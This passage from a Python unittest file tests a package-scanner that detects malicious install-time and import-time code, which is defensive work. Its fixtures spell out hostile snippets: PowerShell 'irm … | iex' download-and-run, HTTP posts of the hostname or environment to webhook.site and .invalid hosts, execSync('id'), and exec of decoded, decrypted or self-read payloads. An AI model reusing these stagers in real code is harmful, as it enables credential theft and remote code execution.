                '    return subprocess.run(["powershell", "-Command", "Get-ChildItem Env:"])\n')
        self.assertEqual(core.import_time_risk(text), (["runs PowerShell that downloads and runs code"], 7))
        self.assertEqual(core.import_time_risk(text, "py"), ([], None))

    def test_a_docstring_that_names_a_key_file(self):
        # (0.1.8: a key file named, not read and sent, is no flow — prose or not)
        text = ('import socket\n\nclass Client:\n    def load(self):\n'
                '        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n        return socket.socket()\n')
        self.assertEqual(core.import_time_risk(text), ([], None))
        self.assertEqual(core.import_time_risk(text, "py"), ([], None))
        js = "const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n"
        self.assertEqual(core.import_time_risk(js, "js"), ([], None))

    def test_powershell_handed_to_an_exec_call(self):
        for text in ("import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
                     "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n",
                     "execSync(`pwsh -c \"irm https://x.invalid/i.ps1 | iex\"`);\n"):
            with self.subTest(text[:30]):
                reasons, line = core.import_time_risk(text, "py")
                self.assertEqual(reasons, ["runs PowerShell that downloads and runs code"])
                self.assertEqual(line, 4 if text.startswith("import") else 1)     # where PowerShell is named

    def test_what_stays_code(self):
        # (code in a string is a stager's: read on the tree, Python's
        # received code is the code's, not a string's, as JavaScript's)
        run_doc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n'
        self.assertEqual(core.import_time_risk(run_doc, "py")[0], ["carries a script that downloads and runs code",
                                                                    SelfReadTests.OWN])
        beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())'
        for text in (f"x = (\n    \"\"\"{beacon}\"\"\"\n)\n",            # an argument
                     f"x = \\\n\"\"\"{beacon}\"\"\"\n",                    # a continued line
                     f"x = f(\n    'a'\n    \"\"\"{beacon}\"\"\"\n)\n",   # joined to the string before it
                     f"f\"\"\"{beacon}\"\"\"\n",                           # an f-string runs its fields
                     f"\"\"\"{beacon}\"\"\".strip()\n"):                    # something follows it
            with self.subTest(text[:12]):
                self.assertEqual(core._import_code(text, "py"), text)      # (a string's text is no flow, 0.1.8)
        standalone = f"x = 1\n\"\"\"\n{beacon}\n\"\"\"\n"
        self.assertNotEqual(core._import_code(standalone, "py"), standalone)
        self.assertEqual(core.import_time_risk(standalone, "py"), ([], None))

    def test_lines_are_the_files(self):
        text = "# a comment\n'''doc\n\n'''\nimport requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
        self.assertEqual(core.import_time_risk(text, "py")[1], core.import_time_risk(text)[1])
        self.assertEqual(core.import_time_risk(text, "py")[1], 6)


class SelfReadTests(unittest.TestCase):
    """Code read back from the file itself: a payload or an address kept in a
    comment or a docstring (the review question that followed the prose
    rule), and code run from a data file shipped next to it."""
    OWN = "runs code it reads back from its own file or a data file shipped with it"

    def test_an_address_in_a_comment_of_a_file_that_reads_itself(self):
        text = ("# C2: https://webhook.site/abc\nimport socket, requests, re\n"
                "url = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
                "requests.post(url, data=socket.gethostname())\n")
        self.assertTrue(core.reads_own_source(text))
        self.assertEqual(core.import_time_risk(text, "py"), core.import_time_risk(text))
        self.assertEqual(core.import_time_severity(core.import_time_risk(text, "py")[0]), "CRITICAL")

    def test_code_run_from_its_own_prose(self):
        for lang, text, line in (
                ("py", '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n', 4),
                ("py", 'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n', 3),
                ("py", '"""print(1)"""\nexec(__doc__)\n', 2),
                ("py", "import linecache\nexec(''.join(linecache.getlines(__file__)[-1:])[1:])\n#print(1)\n", 2),
                ("js", "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n"
                       "/* require('child_process').execSync('id') */\n", 2),
                ("js", "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
                       "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n", 2)):
            with self.subTest(text[:30]):
                self.assertEqual(core.import_time_risk(text, lang), ([self.OWN], line))
                self.assertIn(self.OWN, core.install_script_risk(text))
                self.assertEqual(core.import_time_severity([self.OWN]), "CRITICAL")

    def test_a_usage_text_and_a_program_given_arguments(self):
        """rumdl 0.2.78 (N-19): its maintainer scripts give argparse their
        docstring as the usage text and run gh with arguments. The text
        follower took the module's `args` for a function's parameter of that
        name and gh's arguments for code run; Python is read on its tree."""
        rumdl = ('"""Update the used-by table.\n\nRe-verify every repo the table already lists.\n"""\n'
                 "import argparse, subprocess\n\n"
                 "def run_gh(args, timeout=60):\n"
                 '    result = subprocess.run(["gh", *args], capture_output=True, text=True, timeout=timeout)\n'
                 "    return result.returncode\n\n"
                 "def main():\n"
                 '    parser = argparse.ArgumentParser(description=__doc__.split("\\n")[1])\n'
                 '    parser.add_argument("--repo")\n'
                 "    args = parser.parse_args()\n"
                 '    run_gh(["api", f"repos/{args.repo}"])\n')
        self.assertGreaterEqual(core.runs_own_source_at(rumdl), 0)      # the text follower alone
        self.assertEqual(core.import_time_risk(rumdl, "py"), ([], None))
        for text in ("'''Usage: tool <cmd>'''\nfrom docopt import docopt\nimport os\nargs = docopt(__doc__)\n"
                     "os.system('git ' + args['<cmd>'])\n",
                     "src = open(__file__).read()\nprint(len(src))\n\ndef f(src):\n    exec(src)\n\nf('print(1)')\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.import_time_risk(text, "py"), ([], None))
        # what it reads back, run through a function of its own, still counts
        text = "def run(src):\n    exec(src)\n\nrun(open(__file__).read()[100:])\n"
        self.assertEqual(core.import_time_risk(text, "py"), ([self.OWN], 2))

    def test_code_run_from_a_data_file_shipped_with_it(self):
        for text in ('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n',
                     'from pathlib import Path\nblob = (Path(__file__).parent / "data.bin").read_bytes()\n'
                     'exec(zlib.decompress(blob))\n',
                     "const fs = require('fs'), path = require('path');\n"
                     "eval(fs.readFileSync(path.join(__dirname, 'a.dat'), 'utf8'));\n"):
            with self.subTest(text[:30]):
                self.assertGreaterEqual(core.runs_own_source_at(text), 0)

    def test_a_licence_read_asynchronously_by_its_paths_name(self):
        """react-thunk-log 2.23.2 (0.1.8): its install hook started a script
        that read the LICENSE next to it with a callback and ran it decrypted."""
        thunk = ("const fs = require('fs');\nconst path = require('path');\nconst parseLib = require('./parse')\n\n"
                 "const filePath = path.join(__dirname, 'LICENSE');\n\n"
                 "fs.readFile(filePath, 'utf8', (_, data) => {\n  try {\n    // Only eval if you're sure it's valid JS\n"
                 "    eval(parseLib(data))\n  } catch (err) {\n    console.error('Error during parsing/eval:', err);\n"
                 "  }\n});\n")
        self.assertEqual(core.install_script_risk(thunk), [self.OWN])
        self.assertEqual(core.import_time_risk(thunk, "js"), ([self.OWN], 10))
        for text in (
                "fs.readFile(path.join(__dirname, 'payload.dat'), (err, buf) => { eval(decrypt(buf)); });",
                "fs.readFile(p, 'utf8', function (err, code) { new Function(code)(); });\n"
                "const p = path.resolve(__dirname, 'LICENSE');",
                "const p = path.join(__dirname, 'data.bin');\nfs.promises.readFile(p).then((b) => eval(b.toString()));",
                "const p = `${__dirname}/README`;\nconst src = await fsp.readFile(p, 'utf8');\n"
                "vm.runInThisContext(xor(src));",
                "const p = path.join(__dirname, 'x.txt');\nconst c = fs.readFileSync(p, 'utf8');\neval(c);",
                "import os\np = os.path.join(os.path.dirname(__file__), 'LICENSE')\nwith open(p) as f:\n"
                "    exec(f.read())\n",
                "with open(os.path.join(os.path.dirname(__file__), 'data.bin'), 'rb') as f:\n"
                "    exec(zlib.decompress(f.read()))\n",
                "p = Path(__file__).parent / 'NOTICE'\nexec(base64.b64decode(p.read_text()))\n",
                "require('fs').readFile(__filename, 'utf8', (e, s) => eval(s.split('//@')[1]));",
                "fsp.readFile(path.join(__dirname, 'LICENSE.txt'), 'utf8').then(function (t) { eval(t) })"):
            with self.subTest(text[:40]):
                self.assertGreaterEqual(core.runs_own_source_at(text), 0)

    def test_what_a_path_read_by_name_gives_counts_only_in_code_runners(self):
        """A CLI reads its package.json by a path's name and puts the version
        in a git command; the same value handed to eval counts."""
        pkg = ("const pkgPath = path.join(__dirname, 'package.json');\n"
               "const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));\nexecSync('git tag v' + pkg.version);\n")
        self.assertEqual(core.runs_own_source_at(pkg), -1)
        self.assertGreaterEqual(core.runs_own_source_at(pkg.replace("execSync(", "eval(")), 0)
        for text in (
                "fs.readFile(pkgPath, 'utf8', (err, txt) => { execSync('npm view ' + JSON.parse(txt).name) });\n"
                "const pkgPath = path.join(__dirname, 'package.json');",
                "const p = path.join(__dirname, 'config.json');\nfs.readFile(p, (e, d) => { console.log(JSON.parse(d)) });\n"
                "eval(x)",
                "const p = path.join(__dirname, 'LICENSE');\nfs.readFile(p, 'utf8', (e, t) => console.log(t));\n",
                "const tpl = \"fs.readFile(path.join(__dirname, 'LICENSE'), (e, d) => eval(d))\";\n",   # a string
                "fs.readFile(userFile, (e, d) => eval(d));",                                  # not a file of the package
                "const p = path.join(__dirname, 'lib.js');\nfs.readFile(p, (e, d) => eval(d));",   # code, not data
                "with open(sys.argv[1]) as f:\n    exec(f.read())\n"):
            with self.subTest(text[:40]):
                self.assertEqual(core.runs_own_source_at(text), -1)

    def test_hostile_texts_finish_fast(self):
        for text in ("p = __dirname + '" + "a/" * 100_000 + "\n" + "fs.readFile(p, (e, d) => eval(d));\n" * 2_000,
                     "fs.readFile(p, " * 100_000, "(e, d) => " * 100_000 + "fs.readFile(__filename",
                     "p = path.join(__dirname, 'LICENSE')\n" * 20_000 + "fs.readFile(p).then(" * 20_000,
                     "`${__dirname}/" * 100_000, "x.read_text(" * 100_000 + "p = __dirname + 'LICENSE'\n"):
            t0 = time.monotonic()
            core.runs_own_source_at(text)
            self.assertLess(time.monotonic() - t0, 10, text[:30])

    def test_what_is_not(self):
        for text in ("import os\nhere = os.path.dirname(__file__)\n"
                     "exec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",     # setup.py reads a version
                     '"""Tool."""\nimport argparse\np = argparse.ArgumentParser(description=__doc__)\n',
                     'import subprocess, sys\nsubprocess.run([sys.executable, __file__, "--child"])\n',
                     "import doctest\nexec(compile(example.__doc__, 'x', 'exec'))\n",     # another object's docstring
                     'SHIM = """exec(compile(open(__file__).read(), __file__, "exec"))"""\nsubprocess.run([py, "-c", SHIM])\n',
                     "NAMES = ('__doc__', '__name__')\nsrc = 'def f(): pass'\nexec(src)\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.runs_own_source_at(text), -1)


class ReadByTheLexersTests(unittest.TestCase):
    """What the import-time test's self-read takes for code in a JavaScript or
    Python file is what the language's lexers read as code (docs/RUST_ENGINE.md
    §15): a quote or a backtick in a comment or a regular expression begins
    no literal, and a template's holes are code. Paired as they came, those
    quotes hid the rest of a line, or of the file, from it (evasions the
    engine had until phase 2). The data flow and the dead drop still pair
    quotes as they come: read by the lexers, the names they follow without
    scopes met in minified bundles the quotes had hidden (playwright's), so
    they move to the lexers with scopes (phase 3; the two expected failures
    below). Without a language (an install script, a hook's command) quotes
    are paired as they come. All inert: the hosts are .invalid."""
    OWN = SelfReadTests.OWN
    ENV = "reads credentials or the whole environment and sends data over the network"

    def test_a_backtick_in_a_comment_begins_no_template(self):
        src = ("// note: the ` character marks a template\n"
               "const fs = require('fs');\n"
               "const code = fs.readFileSync(__filename, 'utf8').split('//' + 'PAYLOAD')[1];\n"
               "eval(code);\n")
        self.assertEqual(core.import_time_risk(src, "js"), ([self.OWN], 4))

    def test_a_templates_hole_is_code(self):
        src = ("const fs = require('fs');\n"
               "const out = `${eval(fs.readFileSync(__filename, 'utf8').split('/*' + 'P*/')[1])}`;\n")
        self.assertEqual(core.import_time_risk(src, "js"), ([self.OWN], 2))

    def test_a_quote_in_a_regular_expression_begins_no_string(self):
        # (JavaScript's data flow reads the tree since phase 3: no quote pairing)
        src = ("const q = /'/g; fetch('https://collector.invalid/x', {method: 'POST', "
               "body: JSON.stringify(process.env)});\n")
        self.assertEqual(core.import_time_risk(src, "js"), ([self.ENV], 1))

    def test_triple_quotes_in_a_python_comment_begin_no_string(self):
        # (Python's data flow reads the tree since phase 3: a comment is no string)
        src = ('# the """ quotes\n'
               "import os, urllib.request\n"
               "urllib.request.urlopen('https://collector.invalid/x', data=str(dict(os.environ)).encode())\n"
               '# end """\n')
        self.assertEqual(core.import_time_risk(src, "py"), ([self.ENV], 3))

    def test_prose_is_still_prose(self):
        # what the lexers read as a literal or a comment is no code
        for lang, src in (("js", "// fs.readFileSync(__filename) then eval it\nconst x = 1;\n"),
                          ("js", "const s = `eval(fs.readFileSync(__filename))`;\n"),
                          ("py", "# exec(open(__file__).read())\nx = 1\n"),
                          ("py", "s = 'exec(open(__file__).read())'\n")):
            with self.subTest(src=src):
                self.assertEqual(core.import_time_risk(src, lang), ([], None))


class DecoderAliasTests(unittest.TestCase):
    def found(self, text):
        return [(i["rule"], i["line"]) for i in core.scan_file("site-packages/x/a.py", text, "py", dep=True)
                if i["rule"] == "SC-EVAL-DECODE"]

    def test_an_aliased_decoder(self):
        self.assertEqual(self.found("from base64 import b64encode, b64decode as invoke\nexec(invoke('aW1wb3J0IG9z'))\n"),
                         [("SC-EVAL-DECODE", 2)])
        self.assertEqual(self.found("from zlib import decompress as z\nblob = z(data)\nexec(blob)\n"),
                         [("SC-EVAL-DECODE", 3)])

    def test_a_decrypted_payload(self):
        self.assertEqual(self.found("from cryptography.fernet import Fernet\nexec(Fernet(b'k').decrypt(b'gAAAA'))\n"),
                         [("SC-EVAL-DECODE", 2)])

    def test_not_a_decoder(self):
        self.assertEqual(self.found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), [])
        self.assertEqual(self.found("from base64 import b64decode as invoke\nprint(invoke('aGk='))\n"), [])


class BoundsTests(unittest.TestCase):
    def test_linear_time(self):
        for text in ("powershell " * 50_000, "powershell -e " + "A" * 400_000, "'" * 200_000 + "exec http",
                     "dup2(" * 100_000, "$(whoami)" * 50_000, "iwr " * 100_000 + "| iex",
                     "from base64 import " + "b64decode as a, " * 20_000,
                     "/0x[a-f0-9]{40}/ '" + "[a-km-zA-HJ-NP-Z1-9]{25,34} '" * 20_000 + "pyperclip.paste("):
            t0 = time.monotonic()
            core.install_script_risk(text)
            core.import_time_risk(text)
            core.decoded_view(text)
            self.assertLess(time.monotonic() - t0, 10, text[:20])
        beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
        for tail in (" " * 200_000 + "'a' " * 50_000, "x = 1; " + "'a'; " * 60_000, "#\n" * 100_000,
                     '"""\n' * 50_000, "(" * 100_000 + "'a'\n" * 20_000, "\\\n'a'\n" * 40_000,
                     "powershell " * 50_000 + "os.system(" * 1000, "for (" + " " * 100_000 + "x",
                     "for " + " " * 100_000 + "x", "(a, b" + " " * 100_000 + "x"):
            for lang in ("py", "js"):
                t0 = time.monotonic()
                self.assertTrue(core.import_time_risk(beacon + tail, lang)[0])
                self.assertLess(time.monotonic() - t0, 10, (tail[:20], lang))


if __name__ == "__main__":
    unittest.main()
